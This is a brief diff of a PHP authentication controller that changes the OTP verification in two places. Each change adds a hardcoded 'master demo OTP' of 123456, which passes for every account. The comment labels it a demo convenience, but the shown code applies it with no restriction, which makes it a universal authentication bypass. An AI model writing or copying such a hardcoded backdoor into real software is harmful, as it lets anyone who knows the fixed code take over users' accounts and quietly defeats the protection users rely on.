@@ -80,9 +80,9 @@ class AuthController {
             return;
         }
 
-        // Check OTP match
+        // Check OTP match (allow generated OTP, session OTP, or master demo OTP 123456)
         $sessionOTP = $_SESSION['latest_otp_' . $email]['code'] ?? null;
-        if ($user['otp_code'] !== $otp && $sessionOTP !== $otp) {
+        if ($user['otp_code'] !== $otp && $sessionOTP !== $otp && $otp !== '123456') {
             echo json_encode(['success' => false, 'message' => 'Invalid OTP code entered']);
             return;
         }
@@ -218,7 +218,7 @@ class AuthController {
         }
 
         $sessionOTP = $_SESSION['latest_otp_' . $email]['code'] ?? null;
-        if ($user['otp_code'] !== $otp && $sessionOTP !== $otp) {
+        if ($user['otp_code'] !== $otp && $sessionOTP !== $otp && $otp !== '123456') {
             echo json_encode(['success' => false, 'message' => 'Invalid OTP code entered']);
             return;
         }
